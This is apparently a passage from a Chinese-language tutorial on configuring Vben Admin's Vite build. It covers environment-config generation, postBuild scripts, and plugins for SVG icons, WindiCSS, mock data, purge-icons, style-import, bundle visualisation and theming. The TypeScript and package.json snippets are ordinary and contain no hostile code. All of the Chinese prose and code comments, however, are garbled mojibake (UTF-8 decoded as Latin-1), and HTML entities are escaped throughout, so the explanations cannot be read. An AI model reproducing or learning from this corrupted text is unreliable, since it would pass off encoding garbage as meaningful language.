¹ç›®éŒ„ä¸‹æŒ‡å®šçš„æ–‡ä»¶ï¼Œå°‡è®€å–çš„å…­å‚³å…¥dotenvè¼¸å‡ºå°è±¡ const env = dotenv.parse(fs.readFileSync(path.resolve(process.cwd(), item))); // â†“ å°‡æ–°ç²å–çš„å°è±¡è¿½åŠ åˆ°çµæœä¸­ï¼Œç›¸åŒçš„è¦†è“‹ envConfig = { ...envConfig, ...env }; } catch (error) {} }); // â†“ æª¢æŸ¥è¼¸å‡ºçµæœ Object.keys(envConfig).forEach((key) =\u0026gt; { // â†“ å¦‚æœä¸æ˜¯ä»¥å‚³å…¥çš„matchè®Šé‡é–‹çš„å°±ç›´æ¥åˆªé™¤ const reg = new RegExp(`^(${match})`); if (!reg.test(key)) { Reflect.deleteProperty(envConfig, key); } }); return envConfig; } /** * Get user root directory * @param dir file path */ export function getRootPath(...dir: string[]) { return path.resolve(process.cwd(), ...dir); } Vbençš„ç²å–é…ç½®æ–‡ä»¶åçš„æ–¹æ³• build/getConfigFileName.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 /** * Get the configuration file variable name * @param env */ export const getConfigFileName = (env: Record\u0026lt;string, any\u0026gt;) =\u0026gt; { return ( `__PRODUCTION__${env.VITE_GLOB_APP_SHORT_NAME || \u0026#39;__APP\u0026#39;}__CONF__` // â†“ æ›æˆå¤§å¯« .toUpperCase() // â†“ å°‡ç©ºç™½æ›æˆç©ºå­—ç¬¦ä¸² .replace(/\\s/g, \u0026#39;\u0026#39;) ); }; Vbenå‹•æ…‹é…ç½®ç’°å¢ƒè®Šé‡ èªªæ˜ å‰é¢ç« ç¯€ä¸­ï¼Œæˆ‘å€‘åœ¨build\\vite\\pluginä¸­è¨»é‡‹ä¸€æ®µindex.htmlä¸­æ’å…¥çš„scriptæ®µã€‚é€™ä¸€æ®µscriptæ˜¯ç”¨æ–¼Vbençš„å‹•æ…‹é…ç½®ç’°å¢ƒè®Šé‡çš„ã€‚\nç•¶ä½ æ‰“åŒ…å®Œé …ç›®ä¹‹å¾Œï¼Œä½ çš„é …ç›®çš„ç’°å¢ƒè®Šé‡å°±ä¸å¯ä»¥è®Šäº†ã€‚æ­¤æ™‚å¦‚æœä½ æƒ³ä¿®æ”¹ä¸€ä¸‹é …ç›®çš„åŸºç¤APIè·¯å¾‘ï¼Œé‚£éº¼ä½ éœ€è¦ä¿®æ”¹.envæ–‡ä»¶ï¼Œç„¶å¾Œå†æ¬¡æ‰“åŒ…ä¸€éã€‚é€™éº¼åšå¾ˆéº»ç…©ã€‚æ‰€ä»¥VbenAdminå°‡ç’°å¢ƒè®Šé‡æŠ½é›¢å‡ºä¾†ã€‚\nç•¶ä½ çš„é …ç›®æ‰“åŒ…å®Œæˆä¹‹å¾Œï¼Œå¦‚æœä½ é‚„æƒ³ä¿®æ”¹ç’°å¢ƒè®Šé‡ï¼Œé‚£éº¼å¯ä»¥ç›´æ¥ä¿®æ”¹diståŒ…ä¸‹çš„_app.config.jsæ–‡ä»¶ã€‚\nä¸‹é¢çœ‹å¯¦ç¾ã€‚\nå®‰è£fs-extra 1 yarn add fs-extra @types/fs-extra --dev fs-extraçš„npmé¦–é ï¼šfs-extraæ·»åŠ æœ¬æ©Ÿfsæ¨¡å¡Šä¸­æœªåŒ…å«çš„æ–‡ä»¶ç³»çµ±æ–¹æ³•ã€‚\nç·¨å¯«ç”Ÿæˆé…ç½®æ–‡ä»¶çš„ç¨‹åº Node-Api-fs\nbuild/script/buildConf.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 /** * Generate additional configuration files when used for packaging. The file can be configured with some global variables, so that it can be changed directly externally without repackaging */ import { GLOB_CONFIG_FILE_NAME, OUTPUT_DIR } from \u0026#39;../constant\u0026#39;; import fs, { writeFileSync } from \u0026#39;fs-extra\u0026#39;; import chalk from \u0026#39;chalk\u0026#39;; import { getRootPath, getEnvConfig } from \u0026#39;../utils\u0026#39;; import { getConfigFileName } from \u0026#39;../getConfigFileName\u0026#39;; import pkg from \u0026#39;../../package.json\u0026#39;; function createConfig( { // â†“ windowså°åƒä¸‹çš„å­˜å„²é…ç½®çš„å±¬æ€§å configName, // â†“ å­˜å„²é…ç½®çš„å°è±¡ config, // â†“ JSæ–‡ä»¶å configFileName = GLOB_CONFIG_FILE_NAME, }: { configName: string; config: any; configFileName?: string } = { configName: \u0026#39;\u0026#39;, config: {} } ) { try { // â†“ è®Šé‡å­—ç¬¦ä¸² const windowConf = `window.${configName}`; // Ensure that the variable will not be modified // â†“ å°‡é…ç½®çš„å°åƒä»¥JSONå­—ç¬¦ä¸²æ ¼å¼æ‹¼æ¥åˆ°è®Šé‡å­—ç¬¦ä¸²å¾Œé¢ï¼Œæœ€å¾Œç”¨æ­£å‰‡å°‡ç©ºæ ¼å»æ‰ const configStr = `${windowConf}=${JSON.stringify(config)}; Object.freeze(${windowConf}); Object.defineProperty(window, \u0026#34;${configName}\u0026#34;, { configurable: false, writable: false, }); `.replace(/\\s/g, \u0026#39;\u0026#39;); // â†“ å‰µå»ºdistæ–‡ä»¶å¤¾ fs.mkdirp(getRootPath(OUTPUT_DIR)); // â†“ å°‡å­—ç¬¦ä¸²å¯«å…¥åˆ°distæ–‡ä»¶ä¸‹çš„æŒ‡å®šJSæ–‡ä»¶åçš„æ–‡ä»¶ä¸­ writeFileSync(getRootPath(`${OUTPUT_DIR}/${configFileName}`), configStr); console.log(chalk.cyan(`âœ¨ [${pkg.name}]`) + ` - configuration file is build successfully:`); console.log(chalk.gray(OUTPUT_DIR + \u0026#39;/\u0026#39; + chalk.green(configFileName)) + \u0026#39;\\n\u0026#39;); } catch (error) { console.log(chalk.red(\u0026#39;configuration file configuration file failed to package:\\n\u0026#39; + error)); } } export function runBuildConfig() { // â†“ ç²å–æˆ‘å€‘å¯ä»¥é…ç½®çš„ç’°å¢ƒè®Šé‡å°è±¡ const config = getEnvConfig(); // â†“ ç²å–é…ç½®æ–‡ä»¶çš„JSå const configFileName = getConfigFileName(config); // â†“ å‰µå»ºæ–‡ä»¶ createConfig({ config, configName: configFileName }); } å®‰è£yargs yargsçš„npmé¦–é ï¼šè®€å–ä½ åŸ·è¡Œçš„å‘½ä»¤è¡Œå‘½ä»¤ä¸­çš„åƒæ•¸é¸é …ã€‚\n1 2 yarn add yargs --dev yarn add @types/yargs --dev ç·¨å¯«è…³æœ¬è§¸ç™¼æ–‡ä»¶ chalkçš„npmé¦–é ï¼šä¸€å€‹å½©è‰²console.logçš„å·¥å…·ï¼Œé€™å€‹ä¾è³´è¢«å…¶ä»–ä¾è³´ä½œç‚ºç”Ÿç”¢ä¾è³´å®‰è£åœ¨æœ¬é …ç›®ä¸­äº†ï¼Œæ‰€ä»¥ä¹Ÿä¸å»çŒœæ˜¯å“ªå€‹ä¾è³´çš„äº†ï¼Œç›´æ¥ä½¿ç”¨ã€‚\nbuild/script/postBuild.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // #!/usr/bin/env node import { argv } from \u0026#39;yargs\u0026#39;; import { runBuildConfig } from \u0026#39;./buildConf\u0026#39;; import chalk from \u0026#39;chalk\u0026#39;; import pkg from \u0026#39;../../package.json\u0026#39;; // â†“ å®šç¾©å‰µå»ºé…ç½®æ–‡ä»¶çš„æ–¹æ³•ï¼Œæœ€æ¢ä»¶åˆ¤æ–· export const runBuild = async () =\u0026gt; { try { // ç²å–å‘½ä»¤ä¸­ä¸ä»¥\u0026#39;-\u0026#39;é–‹é ­çš„åƒæ•¸ const argvList = argv._; // Generate configuration file // â†“ å¦‚æœåƒæ•¸ä¸­åŒ…å«\u0026#39;no-conf\u0026#39;ï¼Œé‚£éº¼å°±ä¸å‰µå»ºé…ç½®æ–‡ä»¶ if (!argvList.includes(\u0026#39;no-conf\u0026#39;)) { // â†“ åŒæ­¥å‰µå»ºé…ç½®æ–‡ä»¶ await runBuildConfig(); } console.log(`âœ¨ ${chalk.cyan(`[${pkg.name}]`)}` + \u0026#39; - build successfully!\u0026#39;); } catch (error) { console.log(chalk.red(\u0026#39;vite build error:\\n\u0026#39; + error)); process.exit(1); } }; // â†“ åŸ·è¡Œæ–¹æ³• runBuild(); å®‰è£esno esnoçš„npmé¦–é ï¼šå‘½ä»¤è¡ŒåŸ·è¡Œä¸€å€‹TSæ–‡ä»¶\n1 yarn add esno --dev ç·¨å¯«è…³æœ¬ åœ¨ç·¨è­¯çš„æ™‚å€™èª¿ç”¨TSæ–‡ä»¶ï¼š\npackage.json 1 2 3 4 5 6 7 { \u0026#34;scripts\u0026#34;: { // ... \u0026#34;build\u0026#34;: \u0026#34;vite build \u0026amp;\u0026amp; esno ./build/script/postBuild.ts\u0026#34;, \u0026#34;build-noconf\u0026#34;: \u0026#34;vite build \u0026amp;\u0026amp; esno ./build/script/postBuild.ts no-conf\u0026#34; } } index.htmlæ³¨å…¥é…ç½®æ–‡ä»¶ build/vite/plugin/html.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 /** * Plugin to minimize and use ejs template syntax in index.html. * https://github.com/anncwb/vite-plugin-html */ import type { Plugin } from \u0026#39;vite\u0026#39;; import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; import html from \u0026#39;vite-plugin-html\u0026#39;; import pkg from \u0026#39;../../../package.json\u0026#39;; import { GLOB_CONFIG_FILE_NAME } from \u0026#39;../../constant\u0026#39;; export function configHtmlPlugin(env: ViteEnv, isBuild: boolean) { const { VITE_GLOB_APP_TITLE, VITE_PUBLIC_PATH } = env; const path = VITE_PUBLIC_PATH.endsWith(\u0026#39;/\u0026#39;) ? VITE_PUBLIC_PATH : `${VITE_PUBLIC_PATH}/`; const getAppConfigSrc = () =\u0026gt; { return `${path || \u0026#39;/\u0026#39;}${GLOB_CONFIG_FILE_NAME}?v=${pkg.version}-${new Date().getTime()}`; }; const htmlPlugin: Plugin[] = html({ minify: isBuild, inject: { // Inject data into ejs template injectData: { title: VITE_GLOB_APP_TITLE, }, // Embed the generated app.config.js file // â†“ åœ¨æ­¤è™•æ’å…¥ tags: isBuild ? [ { tag: \u0026#39;script\u0026#39;, attrs: { src: getAppConfigSrc(), }, }, ] : [], }, }); return htmlPlugin; } æ³¨æ„ ä¹‹å¾Œåœ¨æ¥­å‹™é‚è¼¯ä¸­ç²å–ç’°å¢ƒè®Šé‡ï¼Œå°±éœ€è¦å¾é€™å€‹JSæ–‡ä»¶ä¸­ç²å–äº†ã€‚å¾è€Œé”åˆ°åœ¨ç”Ÿç”¢ç’°å¢ƒæ”¹é…ç½®çš„éœ€æ±‚ã€‚\nåƒè€ƒï¼šsrc\\utils\\env.tsï¼Œä½†æ˜¯é€™å€‹å¾Œé¢å†èªªã€‚\nViteæ’ä»¶-vite-plugin-svg-icon èªªæ˜ ç•¶ä½ ä½¿ç”¨è©²æ’ä»¶çš„æ™‚å€™ï¼ŒæŒ‡å®šå¥½å­˜æ”¾svgçš„æ–‡ä»¶å¤¾ã€‚å†æŒ‰ç…§æŒ‡å®šçš„æ–¹å¼å»è¨ªå•svgåœ–ç‰‡ã€‚å°±å¯ä»¥å†ä¸ç”¢ç”Ÿhttpè«‹æ±‚çš„æƒ…æ³ä¸‹æ¸²æŸ“å‡ºsvgåœ–ç‰‡ã€‚\nä½¿ç”¨è©²æ’ä»¶æ™‚ï¼Œæ’ä»¶æœƒè‡ªå‹•å°‡æ‰€æœ‰svgåœ–ç‰‡åŠ è¼‰åˆ°HTMLä¸­ã€‚ä¸¦ä¸”æ¯ä¸€å€‹svgå°‡æœƒè¢«éæ¿¾å»ç„¡ç”¨çš„ä¿¡æ¯æ•¸æ“šã€‚è®“svgé”åˆ°æœ€å°çš„å€¼ã€‚ä¹‹å¾Œä½¿ç”¨svgåœ–ç‰‡å°±åªéœ€è¦æ“ä½œDOMå³å¯ï¼Œè€Œä¸éœ€è¦ç™¼é€httpè«‹æ±‚ã€‚\nå®‰è£ 1 yarn add vite-plugin-svg-icons --dev å‰µå»ºé…ç½® build/vite/plugin/svgSprite.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /** * Vite Plugin for fast creating SVG sprites. * https://github.com/anncwb/vite-plugin-svg-icons */ import SvgIconsPlugin from \u0026#39;vite-plugin-svg-icons\u0026#39;; import path from \u0026#39;path\u0026#39;; export function configSvgIconsPlugin(isBuild: boolean) { const svgIconsPlugin = SvgIconsPlugin({ // â†“ æœ¬åœ°svgåœ–ç‰‡åœ°å€ iconDirs: [path.resolve(process.cwd(), \u0026#39;src/assets/icons\u0026#39;)], svgoOptions: isBuild, // åœ–æ¨™IDçš„æ¨£å¼ symbolId: \u0026#39;icon-[dir]-[name]\u0026#39;, }); return svgIconsPlugin; } é¸é …svgOptionsçš„booleané¡å‹ä¸å¤ªæ¸…æ¥šæ˜¯ä¹¾ä»€éº¼çš„ã€‚ä½†æ˜¯å°åƒé¡å‹æ˜¯æ§åˆ¶svgéæ¿¾ç„¡ç”¨ä¿¡æ¯çš„é¸é …ã€‚ä½¿ç”¨trueæ˜¯ä½¿ç”¨é»˜èªé¸é …ï¼Œfalseæ™‚ä¸çŸ¥é“åšä»€éº¼çš„ä½†æ˜¯ä¹Ÿæ²’ä»€éº¼å½±éŸ¿ã€‚\nç”¨æ–¼é…ç½® build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configSvgIconsPlugin } from \u0026#39;./svgSprite\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-svg-icons vitePlugins.push(configSvgIconsPlugin(isBuild)); // ... return vitePlugins; } mainå°å…¥ src/main.ts 1 2 3 // ... import \u0026#39;vite-plugin-svg-icons/register\u0026#39;; // ... å‰µå»ºSvgçµ„ä»¶ é€™è£¡æœ‰ä¸€å€‹æ¨£å¼ï¼Œæ˜¯å…¨å±€ä¸Šä¸‹æ–‡æ³¨å…¥çš„ã€‚é€™å€‹å¾Œé¢å†è¬›ï¼Œå…ˆå¯«æˆstringã€‚\nsrc/components/Icon/src/SvgIcon.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 \u0026lt;template\u0026gt; \u0026lt;svg class=\u0026#34;vben-svg-icon\u0026#34; :class=\u0026#34;[$attrs.class]\u0026#34; :style=\u0026#34;getStyle\u0026#34; aria-hidden=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;use :xlink:href=\u0026#34;symbolId\u0026#34; /\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import type { CSSProperties } from \u0026#39;vue\u0026#39;; import { defineComponent, computed } from \u0026#39;vue\u0026#39;; // import { useDesign } from \u0026#39;/@/hooks/web/useDesign\u0026#39;; export default defineComponent({ name: \u0026#39;SvgIcon\u0026#39;, props: { prefix: { type: String, default: \u0026#39;icon\u0026#39;, }, name: { type: String, required: true, }, size: { type: [Number, String], default: 16, }, }, setup(props) { // const { prefixCls } = useDesign(\u0026#39;svg-icon\u0026#39;); const symbolId = computed(() =\u0026gt; `#${props.prefix}-${props.name}`); const getStyle = computed( (): CSSProperties =\u0026gt; { const { size } = props; let s = `${size}`; s = `${s.replace(\u0026#39;px\u0026#39;, \u0026#39;\u0026#39;)}px`; return { width: s, height: s, }; } ); // prefixCls, return { symbolId, getStyle }; }, }); \u0026lt;/script\u0026gt; \u0026lt;style lang=\u0026#34;less\u0026#34; scoped\u0026gt; // @prefix-cls: ~\u0026#39;@{namespace}-svg-icon\u0026#39;; // .@{prefix-cls} { .vben-svg-icon { overflow: hidden; vertical-align: -0.15em; fill: currentColor; } \u0026lt;/style\u0026gt; Viteæ’ä»¶-vite-plugin-windicss èªªæ˜ åœ¨Viteä¸Šå–®ç¨ä½¿ç”¨Tailwindæ™‚ï¼Œæ¸²æŸ“é€Ÿåº¦å¾ˆæ…¢ã€‚\nvite-plugin-windicssæ¯”Tailwindå¿«20åˆ°100å€ã€‚\nvite-plugin-windicssçš„npmé¦–é  windicsså®˜ç¶² å®‰è£ 1 yarn add vite-plugin-windicss --dev å‰µå»ºWindicssé…ç½®æ–‡ä»¶ windicssçš„é…ç½® tailwindçš„é…ç½® tailwind.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 import lineClamp from \u0026#39;windicss/plugin/line-clamp\u0026#39;; import colors from \u0026#39;windicss/colors\u0026#39;; import { defineConfig } from \u0026#39;vite-plugin-windicss\u0026#39;; import { primaryColor } from \u0026#39;./build/config/themeConfig\u0026#39;; export default defineConfig({ darkMode: \u0026#39;class\u0026#39;, plugins: [lineClamp, createEnterPlugin()], theme: { extend: { colors: { ...colors, primary: primaryColor, }, screens: { sm: \u0026#39;576px\u0026#39;, md: \u0026#39;768px\u0026#39;, lg: \u0026#39;992px\u0026#39;, xl: \u0026#39;1200px\u0026#39;, \u0026#39;2xl\u0026#39;: \u0026#39;1600px\u0026#39;, }, }, }, }); /** * Used for animation when the element is displayed * @param maxOutput The larger the maxOutput output, the larger the generated css volume */ function createEnterPlugin(maxOutput = 10) { const createCss = (index: number, d = \u0026#39;x\u0026#39;) =\u0026gt; { const upd = d.toUpperCase(); return { [`*\u0026gt; .enter-${d}:nth-child(${index})`]: { transform: `translate${upd}(50px)`, }, [`*\u0026gt; .-enter-${d}:nth-child(${index})`]: { transform: `translate${upd}(-50px)`, }, [`* \u0026gt; .enter-${d}:nth-child(${index}),* \u0026gt; .-enter-${d}:nth-child(${index})`]: { \u0026#39;z-index\u0026#39;: `${10 - index}`, opacity: \u0026#39;0\u0026#39;, animation: `enter-${d}-animation 0.4s ease-in-out 0.3s`, \u0026#39;animation-fill-mode\u0026#39;: \u0026#39;forwards\u0026#39;, \u0026#39;animation-delay\u0026#39;: `${(index * 1) / 10}s`, }, }; }; const handler = ({ addBase }) =\u0026gt; { const addRawCss = {}; for (let index = 1; index \u0026lt; maxOutput; index++) { Object.assign(addRawCss, { ...createCss(index, \u0026#39;x\u0026#39;), ...createCss(index, \u0026#39;y\u0026#39;), }); } addBase({ ...addRawCss, [`@keyframes enter-x-animation`]: { to: { opacity: \u0026#39;1\u0026#39;, transform: \u0026#39;translateX(0)\u0026#39;, }, }, [`@keyframes enter-y-animation`]: { to: { opacity: \u0026#39;1\u0026#39;, transform: \u0026#39;translateY(0)\u0026#39;, }, }, }); }; return { handler }; } å‰µå»ºé…ç½®æ–‡ä»¶ build/vite/plugin/windicss.ts 1 2 3 4 5 6 7 8 9 10 11 12 import type { Plugin } from \u0026#39;vite\u0026#39;; import windiCSS from \u0026#39;vite-plugin-windicss\u0026#39;; export function configWindiCssPlugin(): Plugin[] { return windiCSS({ safelist: \u0026#39;no-select\u0026#39;, preflight: { enableAll: true, }, }); } æ‡‰ç”¨é…ç½® build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import { configWindiCssPlugin } from \u0026#39;./windicss\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-windicss vitePlugins.push(configWindiCssPlugin()); return vitePlugins; } å°å…¥æ¨£å¼ src/main.ts 1 2 3 // ... import \u0026#39;@virtual/windi.css\u0026#39;; // ... Viteæ’ä»¶-vite-plugin-mock èªªæ˜ vite-plugin-mockçš„npmé¦–é \næ ¹æ“šæˆ‘è‡ªå·±çš„å¯¦é©—ï¼š\nlocalEnabledæ§åˆ¶mocké–‹ç™¼ç’°å¢ƒæ˜¯å¦å•Ÿå‹•ã€‚\nå¦‚æœç”Ÿç”¢ç’°å¢ƒæƒ³è¦ä½¿ç”¨mockï¼Œåªæœ‰prodEnabledç‚ºtrueï¼ŒinjectCodeæ³¨å…¥æŒ‡å®šä»£ç¢¼æ™‚æ‰æœƒç”Ÿæ•ˆã€‚\nå®‰è£ 1 yarn add mockjs vite-plugin-mock --dev ç·¨å¯«Mockç”¨ä¾‹ é€™è£¡ç›´æ¥å°‡æ ¹ç›®éŒ„ä¸‹çš„mockç›®éŒ„æ‹·è²å‡ºä¾†å°±è¡Œã€‚\nmock\\_util.tsï¼šè£¡é¢å°è£çš„æ˜¯æ•¸æ“šè«‹æ±‚çµæ§‹é¡å‹ã€‚ mock\\_createProductionServer.tsï¼šç”¨æ–¼é…ç½®ç”Ÿç”¢ç’°å¢ƒå‹•æ…‹Mockçš„jsæ–‡ä»¶ï¼Œæ–‡æª”ä¸­æœ‰èªªã€‚ å…¶ä»–çš„ï¼šéƒ½æ˜¯Mockç”¨ä¾‹ï¼Œæ¯ä¸€å€‹jsã€tsï¼Œéƒ½è¦é»˜èªå°å‡ºä¸€å€‹MockMethodé¡å‹çš„æ•¸çµ„ã€‚æ¯ä¸€é …MockMethodå°±æ˜¯æ””æˆªçš„ä¸€å€‹æ–¹æ³•ã€‚MockMethodçš„responseå°æ‡‰æ–¹æ³•çš„returnå°‡æœƒè¢«Mockå¯¦ä¾‹è™•ç†ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œä½ å¯ä»¥åœ¨returnçš„å°åƒä¸­ä½¿ç”¨Mockè¦å‰‡ã€‚ ä¸é_createProductionServer.tsä¸­ä½¿ç”¨äº†Glob å°å…¥ã€‚\né…ç½®Mock build/vite/plugin/mock.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** * Mock plugin for development and production. * https://github.com/anncwb/vite-plugin-mock */ import { viteMockServe } from \u0026#39;vite-plugin-mock\u0026#39;; export function configMockPlugin(isBuild: boolean) { return viteMockServe({ // â†“ å¿½ç•¥ä»¥_é–‹é ­çš„æ–‡ä»¶ ignore: /^\\_/, // â†“ è§£ææ ¹ç›®éŒ„ä¸‹çš„mockæ–‡ä»¶å¤¾ mockPath: \u0026#39;mock\u0026#39;, localEnabled: !isBuild, prodEnabled: isBuild, injectCode: ` import { setupProdMockServer } from \u0026#39;../mock/_createProductionServer\u0026#39;; setupProdMockServer(); `, }); } é…ç½®é€²Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configMockPlugin } from \u0026#39;./mock\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // vite-plugin-mock VITE_USE_MOCK \u0026amp;\u0026amp; vitePlugins.push(configMockPlugin(isBuild)); return vitePlugins; } Viteæ’ä»¶-vite-plugin-purge-icons èªªæ˜ æœ¬ç« çš„æ’ä»¶æ˜¯å¯ä»¥è®“æˆ‘å€‘å¾ˆæ–¹ä¾¿é«˜æ•ˆçš„ä½¿ç”¨Iconifyä¸­æ‰€æœ‰çš„åœ–æ¨™ã€‚\né€™è£¡è¦è¬›çš„æ˜¯Iconifyå„å€‹ç‰ˆæœ¬æ’ä»¶çš„å€åˆ¥ï¼š\nVue3ç‰ˆIconifyæ’ä»¶ï¼šä½¿ç”¨æ™‚éœ€è¦å®‰è£æŒ‡å®šåº«çš„åœ–æ¨™ï¼Œç„¶å¾Œéœæ…‹å¼•ç”¨ã€‚æ¯ä¸€æ¬¡å¼•ç”¨éƒ½æœƒç”¢ç”Ÿä¸€æ¬¡httpè«‹æ±‚ã€‚ PurgeIconsï¼šå°‡æˆ‘å€‘æ‰€ä½¿ç”¨çš„Iconifyåœ–æ¨™éƒ½å·²htmlçš„domç¯€é»å½¢å¼ä¿å­˜åœ¨htmlä¸­ï¼Œé€™æ¨£æˆ‘å€‘å°±å¯ä»¥ä¸ç™¼é€httpè«‹æ±‚å°±å¯ä»¥ä½¿ç”¨åœ–æ¨™äº†ã€‚ vite-plugin-purge-iconsï¼šå°±æ˜¯Viteç‰ˆçš„PurgeIconsã€‚ vite-plugin-purge-iconsçš„npmé¦–é \nå®‰è£ 1 2 yarn add @iconify/iconify yarn add vite-plugin-purge-icons @iconify/json --dev é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 // ... import PurgeIcons from \u0026#39;vite-plugin-purge-icons\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-purge-icons vitePlugins.push(PurgeIcons()); // ... return vitePlugins; } æ³¨æ„ Iconçµ„ä»¶å¾Œé¢å†å°è£ï¼Œç”±æ–¼æˆ‘å€‘main.tsä¸­æ²’æœ‰å¼•å…¥vite-plugin-purge-iconsã€‚æ‰€ä»¥ï¼Œé€™è£¡é‚„ä¸èƒ½ä½¿ç”¨ã€‚å¾Œé¢æœƒå‹•æ…‹ç”Ÿæˆåœ–æ¨™ã€‚\nViteæ’ä»¶-vite-plugin-style-import èªªæ˜ vite-plugin-style-importçš„npmé¦–é \nè©²æ’ä»¶å¯æŒ‰éœ€å°å…¥çµ„ä»¶åº«æ¨£å¼ï¼Œç”±æ–¼ vite æœ¬èº«å·²æŒ‰éœ€å°å…¥äº†çµ„ä»¶åº«ï¼Œå› æ­¤åƒ…æ¨£å¼ä¸æ˜¯æŒ‰éœ€å°å…¥çš„ï¼Œå› æ­¤åªéœ€æŒ‰éœ€å°å…¥æ¨£å¼å³å¯ã€‚\nå®‰è£ 1 yarn add vite-plugin-style-import --dev é…ç½®æ’ä»¶ build/vite/plugin/styleImport.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** * Introduces component library styles on demand. * https://github.com/anncwb/vite-plugin-style-import */ import styleImport from \u0026#39;vite-plugin-style-import\u0026#39;; export function configStyleImportPlugin() { // if (!isBuild) return []; const pwaPlugin = styleImport({ libs: [ { libraryName: \u0026#39;ant-design-vue\u0026#39;, esModule: true, resolveStyle: (name) =\u0026gt; { return `ant-design-vue/es/${name}/style/index`; }, }, ], }); return pwaPlugin; } é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configStyleImportPlugin } from \u0026#39;./styleImport\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // vite-plugin-style-import vitePlugins.push(configStyleImportPlugin()); return vitePlugins; } Viteæ’ä»¶-rollup-plugin-visualizer èªªæ˜ rollup-plugin-visualizerçš„npmé¦–é ï¼šä¾è³´åˆ†ææ’ä»¶ã€‚ cross-envçš„npmé¦–é ï¼šå‘½ä»¤è¡Œé…ç½®ç’°å¢ƒè®Šé‡ã€‚ å®‰è£ 1 yarn add rollup-plugin-visualizer @types/rollup-plugin-visualizer --dev é…ç½®æ’ä»¶ build/vite/plugin/visualizer.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /** * Package file volume analysis */ import visualizer from \u0026#39;rollup-plugin-visualizer\u0026#39;; import { isReportMode } from \u0026#39;../../utils\u0026#39;; import type { Plugin } from \u0026#39;vite\u0026#39;; export function configVisualizerConfig() { if (isReportMode()) { return visualizer({ filename: \u0026#39;./node_modules/.cache/visualizer/stats.html\u0026#39;, open: true, // @ts-ignore gzipSize: true, // @ts-ignore brotliSize: true, }) as Plugin; } return []; } é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configVisualizerConfig } from \u0026#39;./visualizer\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // rollup-plugin-visualizer vitePlugins.push(configVisualizerConfig()); return vitePlugins; } å®‰è£cross-env 1 yarn add cross-env --dev ç·¨è¼¯è…³æœ¬ package.json 1 2 3 4 5 6 7 8 9 { // ... \u0026#34;scripts\u0026#34;: { // ... \u0026#34;report\u0026#34;: \u0026#34;cross-env REPORT=true npm run build\u0026#34; // ... } // ... } Viteæ’ä»¶-vite-plugin-theme èªªæ˜ vite-plugin-themeçš„npmé¦–é ï¼šGitç«™é»ï¼Œnpmçš„å¤±æ•ˆäº†ã€‚\nç”¨æ–¼å‹•æ…‹æ›´æ”¹ç•Œé¢ä¸»é¡Œè‰²çš„ vite æ’ä»¶ã€‚\né…ç½®æ’ä»¶ build/vite/plugin/theme.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /** * Vite plugin for website theme color switching * https://github.com/anncwb/vite-plugin-theme */ import { viteThemePlugin, mixLighten, mixDarken, tinycolor } from \u0026#39;vite-plugin-theme\u0026#39;; import { getThemeColors, generateColors } from \u0026#39;../../config/themeConfig\u0026#39;; export function configThemePlugin() { const colors = generateColors({ mixDarken, mixLighten, tinycolor, }); const plugin = viteThemePlugin({ // â†“ ä¹‹å‰ç”Ÿæˆçš„å¾ˆå¤šå€‹é¡è‰² colorVariables: [...getThemeColors(), ...colors], }); return plugin; } é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configThemePlugin } from \u0026#39;./theme\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... //vite-plugin-theme vitePlugins.push(configThemePlugin()); return vitePlugins; } ä¿®æ”¹ä¸»é¡Œæ–¹æ³• 